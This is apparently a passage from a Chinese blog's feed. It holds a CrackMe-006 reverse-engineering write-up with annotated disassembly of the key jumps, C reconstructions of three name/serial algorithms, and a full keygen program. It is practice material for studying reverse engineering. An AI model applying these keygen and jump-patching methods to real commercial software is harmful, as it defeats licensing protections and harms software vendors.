ss:[ebp-0x4]</span><br><span class="line">00442CA7  |.  E8 ACFCFBFF   call aLoNg3x_.00402958</span><br><span class="line">00442CAC  |.  8BF0          mov esi,eax</span><br><span class="line">00442CAE  |.  837D FC 00    cmp dword ptr ss:[ebp-0x4],0x0</span><br><span class="line">00442CB2  |.  74 18         je short aLoNg3x_.00442CCC</span><br><span class="line">00442CB4  |.  8D55 F4       lea edx,dword ptr ss:[ebp-0xC]</span><br><span class="line">00442CB7  |.  8BC6          mov eax,esi</span><br><span class="line">00442CB9  |.  E8 8249FCFF   call aLoNg3x_.00407640</span><br><span class="line">00442CBE  |.  8B55 F4       mov edx,dword ptr ss:[ebp-0xC]</span><br><span class="line">00442CC1  |.  8B83 E0020000 mov eax,dword ptr ds:[ebx+0x2E0]</span><br><span class="line">00442CC7  |.  E8 2406FEFF   call aLoNg3x_.004232F0</span><br><span class="line">00442CCC  |&gt;  8B83 D0020000 mov eax,dword ptr ds:[ebx+0x2D0]</span><br><span class="line">00442CD2  |.  8078 47 00    cmp byte ptr ds:[eax+0x47],0x0</span><br><span class="line">00442CD6  |.  75 0F         jnz short aLoNg3x_.00442CE7              ;  关键跳转1</span><br><span class="line">00442CD8  |.  B2 01         mov dl,0x1</span><br><span class="line">00442CDA  |.  8B83 CC020000 mov eax,dword ptr ds:[ebx+0x2CC]         ;  comctl_1.74646957</span><br><span class="line">00442CE0  |.  8B08          mov ecx,dword ptr ds:[eax]               ;  aLoNg3x_.0044282C</span><br><span class="line">00442CE2  |.  FF51 60       call dword ptr ds:[ecx+0x60]             ;  IsEnableWindow</span><br><span class="line">00442CE5  |.  EB 49         jmp short aLoNg3x_.00442D30</span><br><span class="line">00442CE7  |&gt;  8D55 F8       lea edx,dword ptr ss:[ebp-0x8]</span><br><span class="line">00442CEA  |.  8B83 E0020000 mov eax,dword ptr ds:[ebx+0x2E0]</span><br><span class="line">00442CF0  |.  E8 CB05FEFF   call aLoNg3x_.004232C0</span><br><span class="line">00442CF5  |.  8B45 F8       mov eax,dword ptr ss:[ebp-0x8]</span><br><span class="line">00442CF8  |.  50            push eax</span><br><span class="line">00442CF9  |.  8D55 F0       lea edx,dword ptr ss:[ebp-0x10]</span><br><span class="line">00442CFC  |.  8B83 DC020000 mov eax,dword ptr ds:[ebx+0x2DC]</span><br><span class="line">00442D02  |.  E8 B905FEFF   call aLoNg3x_.004232C0</span><br><span class="line">00442D07  |.  8B45 F0       mov eax,dword ptr ss:[ebp-0x10]</span><br><span class="line">00442D0A  |.  5A            pop edx                                  ;  aLoNg3x_.0041E13E</span><br><span class="line">00442D0B  |.  E8 2CFDFFFF   call aLoNg3x_.00442A3C</span><br><span class="line">00442D10  |.  84C0          test al,al</span><br><span class="line">00442D12  |.  74 0F         je short aLoNg3x_.00442D23               ;  关键跳转2</span><br><span class="line">00442D14  |.  B2 01         mov dl,0x1</span><br><span class="line">00442D16  |.  8B83 CC020000 mov eax,dword ptr ds:[ebx+0x2CC]         ;  comctl_1.74646957</span><br><span class="line">00442D1C  |.  8B08          mov ecx,dword ptr ds:[eax]               ;  aLoNg3x_.0044282C</span><br><span class="line">00442D1E  |.  FF51 60       call dword ptr ds:[ecx+0x60]             ;  IsEnableWindow</span><br><span class="line">00442D21  |.  EB 0D         jmp short aLoNg3x_.00442D30</span><br><span class="line">00442D23  |&gt;  33D2          xor edx,edx</span><br><span class="line">00442D25  |.  8B83 CC020000 mov eax,dword ptr ds:[ebx+0x2CC]         ;  comctl_1.74646957</span><br><span class="line">00442D2B  |.  8B08          mov ecx,dword ptr ds:[eax]               ;  aLoNg3x_.0044282C</span><br><span class="line">00442D2D  |.  FF51 60       call dword ptr ds:[ecx+0x60]</span><br><span class="line">00442D30  |&gt;  33C0          xor eax,eax</span><br><span class="line">00442D32  |.  5A            pop edx                                  ;  aLoNg3x_.0041E13E</span><br><span class="line">00442D33  |.  59            pop ecx                                  ;  aLoNg3x_.0041E13E</span><br><span class="line">00442D34  |.  59            pop ecx                                  ;  aLoNg3x_.0041E13E</span><br><span class="line">00442D35  |.  64:8910       mov dword ptr fs:[eax],edx</span><br><span class="line">00442D38  |.  68 5D2D4400   push aLoNg3x_.00442D5D</span><br><span class="line">00442D3D  |&gt;  8D45 F0       lea eax,dword ptr ss:[ebp-0x10]</span><br><span class="line">00442D40  |.  E8 730AFCFF   call aLoNg3x_.004037B8</span><br><span class="line">00442D45  |.  8D45 F4       lea eax,dword ptr ss:[ebp-0xC]</span><br><span class="line">00442D48  |.  E8 6B0AFCFF   call aLoNg3x_.004037B8</span><br><span class="line">00442D4D  |.  8D45 F8       lea eax,dword ptr ss:[ebp-0x8]</span><br><span class="line">00442D50  |.  E8 630AFCFF   call aLoNg3x_.004037B8</span><br><span class="line">00442D55  \.  C3            retn</span><br></pre></td></tr></table></figure><p>尝试在eax+0x47这下硬件写入断点，发现并不能断下来，说明还是没有满足某个条件。</p><p>看第二个关键函数，可以看到一个计算，通过用户名算出serial，懒得再解释了QAQ，直接看下面代码吧。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00442A8E  |.  B8 01000000   mov eax,0x1</span><br><span class="line">00442A93  |&gt;  8B4D FC       /mov ecx,dword ptr ss:[ebp-0x4]          ;  user32.75B17276</span><br><span class="line">00442A96  |.  0FB64C01 FF   |movzx ecx,byte ptr ds:[ecx+eax-0x1]</span><br><span class="line">00442A9B  |.  8B75 FC       |mov esi,dword ptr ss:[ebp-0x4]          ;  user32.75B17276</span><br><span class="line">00442A9E  |.  0FB63406      |movzx esi,byte ptr ds:[esi+eax]</span><br><span class="line">00442AA2  |.  0FAFCE        |imul ecx,esi</span><br><span class="line">00442AA5  |.  0FAFC8        |imul ecx,eax</span><br><span class="line">00442AA8  |.  03D9          |add ebx,ecx</span><br><span class="line">00442AAA  |.  40            |inc eax</span><br><span class="line">00442AAB  |.  4A            |dec edx</span><br><span class="line">00442AAC  |.^ 75 E5         \jnz short aLoNg3x_.00442A93</span><br><span class="line">00442AAE  |&gt;  8B45 F8       mov eax,dword ptr ss:[ebp-0x8]</span><br><span class="line">00442AB1  |.  E8 BA4BFCFF   call aLoNg3x_.00407670</span><br><span class="line">00442AB6  |.  2BD8          sub ebx,eax</span><br><span class="line">00442AB8  |.  81FB 9A020000 cmp ebx,0x29A</span><br><span class="line">00442ABE  |.  75 04         jnz short aLoNg3x_.00442AC4</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(szname);</span><br><span class="line"><span class="keyword">int</span> sum = len;</span><br><span class="line"><span class="keyword">int</span> temp = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">sum = ((szname[i] * szname[i + <span class="number">1</span>]) * temp) + sum;</span><br><span class="line">temp++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> serial;</span><br><span class="line">serial = sum - <span class="number">0x29A</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, serial);</span><br></pre></td></tr></table></figure><p><img src="/2021/08/02/160CrackMe-006/5.png"></p><p>输入发现OK按钮已经亮了</p><p><img src="/2021/08/02/160CrackMe-006/6.png"></p><p>点击OK按钮发现，没有用，codice清0，然后OK又灰色了。</p><p><img src="/2021/08/02/160CrackMe-006/7.png"></p><p>从OK按钮入手，发现刚进来的第一个跳转就是熟悉的判断条件，说明程序并不是直接点击OK的，在这之前肯定还有一个条件要满足的。先继续在这里看一下，修改这个条件往下走，可以看到第二个跳转，修改这个跳转，按钮就会小时，经过分析之前这个函数就是算法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">00442D64  /.  55            push ebp</span><br><span class="line">00442D65  |.  8BEC          mov ebp,esp</span><br><span class="line">00442D67  |.  6A 00         push 0x0</span><br><span class="line">00442D69  |.  53            push ebx</span><br><span class="line">00442D6A  |.  8BD8          mov ebx,eax</span><br><span class="line">00442D6C  |.  33C0          xor eax,eax</span><br><span class="line">00442D6E  |.  55            push ebp</span><br><span class="line">00442D6F  |.  68 ED2D4400   push aLoNg3x_.00442DED</span><br><span class="line">00442D74  |.  64:FF30       push dword ptr fs:[eax]</span><br><span class="line">00442D77  |.  64:8920       mov dword ptr fs:[eax],esp</span><br><span class="line">00442D7A  |.  8B83 D0020000 mov eax,dword ptr ds:[ebx+0x2D0]</span><br><span class="line">00442D80  |.  8078 47 01    cmp byte ptr ds:[eax+0x47],0x1           ;  熟悉的地址</span><br><span class="line">00442D84  |.  75 12         jnz short aLoNg3x_.00442D98</span><br><span class="line">00442D86  |.  BA 002E4400   mov edx,aLoNg3x_.00442E00                ;  UNICODE &quot;0&quot;</span><br><span class="line">00442D8B  |.  8B83 E0020000 mov eax,dword ptr ds:[ebx+0x2E0]</span><br><span class="line">00442D91  |.  E8 5A05FEFF   call aLoNg3x_.004232F0</span><br><span class="line">00442D96  |.  EB 3F         jmp short aLoNg3x_.00442DD7</span><br><span class="line">00442D98  |&gt;  8D55 FC       lea edx,dword ptr ss:[ebp-0x4]</span><br><span class="line">00442D9B  |.  8B83 E0020000 mov eax,dword ptr ds:[ebx+0x2E0]</span><br><span class="line">00442DA1  |.  E8 1A05FEFF   call aLoNg3x_.004232C0</span><br><span class="line">00442DA6  |.  8B45 FC       mov eax,dword ptr ss:[ebp-0x4]</span><br><span class="line">00442DA9  |.  E8 C248FCFF   call aLoNg3x_.00407670</span><br><span class="line">00442DAE  |.  50            push eax</span><br><span class="line">00442DAF  |.  8D55 FC       lea edx,dword ptr ss:[ebp-0x4]</span><br><span class="line">00442DB2  |.  8B83 DC020000 mov eax,dword ptr ds:[ebx+0x2DC]</span><br><span class="line">00442DB8  |.  E8 0305FEFF   call aLoNg3x_.004232C0</span><br><span class="line">00442DBD  |.  8B45 FC       mov eax,dword ptr ss:[ebp-0x4]</span><br><span class="line">00442DC0  |.  5A            pop edx                                  ;  0018F8D4</span><br><span class="line">00442DC1  |.  E8 DAFDFFFF   call aLoNg3x_.00442BA0                   ;  算法</span><br><span class="line">00442DC6  |.  84C0          test al,al</span><br><span class="line">00442DC8  |.  74 0D         je short aLoNg3x_.00442DD7</span><br><span class="line">00442DCA  |.  33D2          xor edx,edx</span><br><span class="line">00442DCC  |.  8B83 CC020000 mov eax,dword ptr ds:[ebx+0x2CC]</span><br><span class="line">00442DD2  |.  E8 D903FEFF   call aLoNg3x_.004231B0</span><br><span class="line">00442DD7  |&gt;  33C0          xor eax,eax</span><br><span class="line">00442DD9  |.  5A            pop edx                                  ;  0018F8D4</span><br><span class="line">00442DDA  |.  59            pop ecx                                  ;  0018F8D4</span><br><span class="line">00442DDB  |.  59            pop ecx                                  ;  0018F8D4</span><br><span class="line">00442DDC  |.  64:8910       mov dword ptr fs:[eax],edx</span><br><span class="line">00442DDF  |.  68 F42D4400   push aLoNg3x_.00442DF4</span><br><span class="line">00442DE4  |&gt;  8D45 FC       lea eax,dword ptr ss:[ebp-0x4]</span><br><span class="line">00442DE7  |.  E8 CC09FCFF   call aLoNg3x_.004037B8</span><br><span class="line">00442DEC  \.  C3            retn</span><br></pre></td></tr></table></figure><p>进入算法进行查看，可以看到一个通过注册码求用户名的过程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">00442C09  |.  0FB64430 FF   |movzx eax,byte ptr ds:[eax+esi-0x1]     ;  获取最后一位</span><br><span class="line">00442C0E  |.  F7E8          |imul eax                                ;  平方</span><br><span class="line">00442C10  |.  0FBFC0        |movsx eax,ax</span><br><span class="line">00442C13  |.  F7EE          |imul esi                                ;  乘以长度/长度不断-1</span><br><span class="line">00442C15  |.  B9 19000000   |mov ecx,0x19</span><br><span class="line">00442C1A  |.  99            |cdq</span><br><span class="line">00442C1B  |.  F7F9          |idiv ecx</span><br><span class="line">00442C1D  |.  83C2 41       |add edx,0x41                            ;  除以0x19余数+0x41</span><br><span class="line">00442C20  |.  58            |pop eax                                 ;  0018F8D4</span><br><span class="line">00442C21  |.  8810          |mov byte ptr ds:[eax],dl</span><br><span class="line">00442C23  |.  4E            |dec esi</span><br><span class="line">00442C24  |.  85F6          |test esi,esi</span><br><span class="line">00442C26  |.^ 75 D1         \jnz short aLoNg3x_.00442BF9</span><br><span class="line">00442C28  |&gt;  8B45 F4       mov eax,dword ptr ss:[ebp-0xC]</span><br><span class="line">00442C2B  |.  8B55 FC       mov edx,dword ptr ss:[ebp-0x4]</span><br><span class="line">00442C2E  |.  E8 110FFCFF   call aLoNg3x_.00403B44                   ;  与输入的用户名进行比较</span><br><span class="line">00442C33  |.  75 17         jnz short aLoNg3x_.00442C4C</span><br></pre></td></tr></table></figure><p>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">itoa(serial, name,<span class="number">10</span>);</span><br><span class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(name);</span><br><span class="line"><span class="keyword">int</span> a = len;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line"><span class="keyword">int</span> temp = name[a<span class="number">-1</span>] * name[a<span class="number">-1</span>];</span><br><span class="line">temp = temp *  a;</span><br><span class="line">temp = temp % <span class="number">0x19</span>;</span><br><span class="line">temp = temp + <span class="number">0x41</span>;</span><br><span class="line">name[a - <span class="number">1</span>] = temp;</span><br><span class="line">a = a -  <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, name);</span><br></pre></td></tr></table></figure><p>现在就剩下最后一个事件，CancellaClick</p><p>进去查看，发现里面没有那个熟悉的地址，那么基本上那个地址的赋值应该就是在这里了吧，只有一个跳转，修改条件后，最早下的硬件断点终于断下来了。那么查看一下算法的过程。</p><p><img src="/2021/08/02/160CrackMe-006/8.png"></p><p>进入函数查看，可以看到具体的算法，是一个通过用户名求注册码的过程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">00442B20  |.  83F8 05       cmp eax,0x5                              ;  判断输入的name是否大于5</span><br><span class="line">00442B23  |.  7E 53         jle short aLoNg3x_.00442B78</span><br><span class="line">00442B25  |.  8B45 FC       mov eax,dword ptr ss:[ebp-0x4]</span><br><span class="line">00442B28  |.  0FB640 04     movzx eax,byte ptr ds:[eax+0x4]          ;  获取name第五位</span><br><span class="line">00442B2C  |.  B9 07000000   mov ecx,0x7</span><br><span class="line">00442B31  |.  33D2          xor edx,edx</span><br><span class="line">00442B33  |.  F7F1          div ecx                                  ;  除以7</span><br><span class="line">00442B35  |.  8BC2          mov eax,edx                              ;  余数</span><br><span class="line">00442B37  |.  83C0 02       add eax,0x2</span><br><span class="line">00442B3A  |.  E8 E1FEFFFF   call aLoNg3x_.00442A20                   ;  阶乘</span><br><span class="line">00442B3F  |.  8BF0          mov esi,eax</span><br><span class="line">00442B41  |.  33DB          xor ebx,ebx</span><br><span class="line">00442B43  |.  8B45 FC       mov eax,dword ptr ss:[ebp-0x4]</span><br><span class="line">00442B46  |.  E8 E90EFCFF   call aLoNg3x_.00403A34</span><br><span class="line">00442B4B  |.  85C0          test eax,eax</span><br><span class="line">00442B4D  |.  7E 16         jle short aLoNg3x_.00442B65</span><br><span class="line">00442B4F  |.  BA 01000000   mov edx,0x1</span><br><span class="line">00442B54  |&gt;  8B4D FC       /mov ecx,dword ptr ss:[ebp-0x4]</span><br><span class="line">00442B57  |.  0FB64C11 FF   |movzx ecx,byte ptr ds:[ecx+edx-0x1]     ;  逐位获取</span><br><span class="line">00442B5C  |.  0FAFCE        |imul ecx,esi</span><br><span class="line">00442B5F  |.  03D9          |add ebx,ecx                             ;  user32.75B16D51</span><br><span class="line">00442B61  |.  42            |inc edx</span><br><span class="line">00442B62  |.  48            |dec eax</span><br><span class="line">00442B63  |.^ 75 EF         \jnz short aLoNg3x_.00442B54</span><br><span class="line">00442B65  |&gt;  2B5D F8       sub ebx,dword ptr ss:[ebp-0x8]           ;  减去注册码十六进制</span><br><span class="line">00442B68  |.  81FB 697A0000 cmp ebx,0x7A69</span><br><span class="line">00442B6E  |.  75 04         jnz short aLoNg3x_.00442B74</span><br><span class="line">00442B70  |.  B3 01         mov bl,0x1                               ;  关键的赋值</span><br><span class="line">00442B72  |.  EB 06         jmp short aLoNg3x_.00442B7A</span><br><span class="line">00442B74  |&gt;  33DB          xor ebx,ebx</span><br><span class="line">00442B76  |.  EB 02         jmp short aLoNg3x_.00442B7A</span><br></pre></td></tr></table></figure><p>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a = szname[<span class="number">4</span>] % <span class="number">0x7</span>;</span><br><span class="line">a = a + <span class="number">2</span>;</span><br><span class="line"><span class="keyword">int</span> num = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= a; i++) &#123;</span><br><span class="line">num = num * i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(szname);</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">sum += szname[i] * num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> serial;</span><br><span class="line">serial = sum - <span class="number">0x7A69</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, serial);</span><br><span class="line"><span class="keyword">return</span> serial;</span><br></pre></td></tr></table></figure><p>当经过了这个判断之后，那个地址就会被赋值，同时cancle按钮也会消失，ok按钮会常亮。</p><p><img src="/2021/08/02/160CrackMe-006/9.png"></p><p>那么整体的流程就很清楚，首先要通过用户名计算一个注册码输入cancle按钮消失，ok变亮，然后再通过注册码计算出一个用户名输入后，ok消失，完成注册</p><h4 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h4><p>完整注册机代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">CancleClick</span><span class="params">(<span class="keyword">char</span>* szname)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = szname[<span class="number">4</span>] % <span class="number">0x7</span>;</span><br><span class="line">a = a + <span class="number">2</span>;</span><br><span class="line"><span class="keyword">int</span> num = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= a; i++) &#123;</span><br><span class="line">num = num * i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(szname);</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">sum += szname[i] * num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> serial;</span><br><span class="line">serial = sum - <span class="number">0x7A69</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, serial);</span><br><span class="line"><span class="keyword">return</span> serial;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CodiceChange</span><span class="params">(<span class="keyword">char</span>* szname)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(szname);</span><br><span class="line"><span class="keyword">int</span> sum = len;</span><br><span class="line"><span class="keyword">int</span> temp = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">sum = ((szname[i] * szname[i + <span class="number">1</span>]) * temp) + sum;</span><br><span class="line">temp++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> serial;</span><br><span class="line">serial = sum - <span class="number">0x29A</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, serial);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OkClick</span><span class="params">(<span class="keyword">int</span> serial)</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">itoa(serial, name,<span class="number">10</span>);</span><br><span class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(name);</span><br><span class="line"><span class="keyword">int</span> a = len;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line"><span class="keyword">int</span> temp = name[a<span class="number">-1</span>] * name[a<span class="number">-1</span>];</span><br><span class="line">temp = temp *  a;</span><br><span class="line">temp = temp % <span class="number">0x19</span>;</span><br><span class="line">temp = temp + <span class="number">0x41</span>;</span><br><span class="line">name[a - <span class="number">1</span>] = temp;</span><br><span class="line">a = a -  <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">gets_s(name, <span class="number">20</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;让cancle消失，通过用户名求出的serial\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> serial = CancleClick(name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-------------------------\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;仅仅只是显示OK按钮\n&quot;</span>);</span><br><span class="line">CodiceChange(name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-------------------------\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;让OK消失，通过serial：%d\n求出的用户名\n&quot;</span>,serial);</span><br><span class="line">OkClick(serial);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/02/160CrackMe-006/10.png"></p><p>cancle按钮</p><p><img src="/2021/08/02/160CrackMe-006/11.png"></p><p>OK按钮</p><p><img src="/2021/08/02/160CrackMe-006/12.png"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>程序共有三个算法</p><ul><li>nomechange和codicechange里的，仅仅只是让OK亮起来</li><li>cancleClick里的，消失cancle按钮，赋值给那个关键地方，OK亮起</li><li>OKClick里的，让OK按钮消失</li></ul><p>不知道nomechange和codicechange里的算法有什么用，感觉没必要。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;初探&quot;&gt;&lt;a href=&quot;#初探&quot; class=&quot;headerlink&quot; title=&quot;初探&quot;&gt;&lt;/a&gt;初探&lt;/h4&gt;&lt;p&gt;打开程序如下看到OK是不可点击的，是一个灰色按钮。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/08/02/160CrackMe-006/</summary>
      
    
    
    
    <category term="CrackMe" scheme="https://b1ack1e.github.io/categories/CrackMe/"/>
    
    
    <category term="逆向工程" scheme="https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="CrackMe" scheme="https://b1ack1e.github.io/tags/CrackMe/"/>
    
  </entry>
  
  <entry>
    <title>160CrackMe-004</title>
    <link href="https://b1ack1e.github.io/2021/07/29/160CrackMe-004/"/>
    <id>https://b1ack1e.github.io/2021/07/29/160CrackMe-004/</id>
    <published>2021-07-29T02:29:39.000Z</published>
    <updated>2021-07-29T07:13:43.913Z</updated>
    
